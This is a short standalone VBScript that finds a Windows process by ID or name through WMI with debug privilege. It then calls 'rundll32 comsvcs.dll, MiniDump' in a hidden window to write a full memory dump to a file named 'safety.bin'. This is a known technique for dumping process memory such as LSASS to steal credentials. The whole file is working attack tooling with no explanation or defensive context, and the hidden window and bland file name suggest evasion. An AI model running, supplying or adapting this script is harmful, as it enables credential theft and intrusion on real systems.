Option Explicit

Const SW_HIDE = 0

If (WScript.Arguments.Count <> 1) Then
    WScript.Quit
Else
    Dim fso, svc, list, proc, startup, cfg, pid, str, cmd, query, dmp
    
    pid = WScript.Arguments(0)

    Set fso  = CreateObject("Scripting.FileSystemObject")
    Set svc  = GetObject("WINMGMTS:{impersonationLevel=impersonate, (Debug)}")
    
    If(Not IsNumeric(pid)) Then
      query = "Name"
    Else
      query = "ProcessId"
    End If
    
    Set list = svc.ExecQuery("SELECT * From Win32_Process Where " & _
      query & " = '" & pid & "'")
    
    If (list.Count = 0) Then
      WScript.StdOut.WriteLine("Can't find active process : " & pid)
      WScript.Quit()
    End If

    For Each proc in list
      pid = proc.ProcessId
      str = proc.Name
      Exit For
    Next

    dmp = "safety.bin"
    
    If(fso.FileExists(dmp)) Then
      WScript.StdOut.WriteLine("Removing " & dmp)
      fso.DeleteFile(dmp)
    End If
    
    WScript.StdOut.WriteLine("Attempting to dump memory from " & _
      str & ":" & pid & " to " & dmp)
    
    Set proc       = svc.Get("Win32_Process")
    Set startup    = svc.Get("Win32_ProcessStartup")
    Set cfg        = startup.SpawnInstance_
    cfg.ShowWindow = SW_HIDE

    cmd = "rundll32 C:\windows\system32\comsvcs.dll, MiniDump " & _
          pid & " " & fso.GetAbsolutePathName(".") & "\" & _
          dmp & " full"
    
    Call proc.Create (cmd, null, cfg, pid)
    
    ' sleep for a second
    Wscript.Sleep(1000)
    
    If(fso.FileExists(dmp)) Then
      WScript.StdOut.WriteLine("saved " & dmp)
    Else
      WScript.StdOut.WriteLine("fail.")
    End If
End If
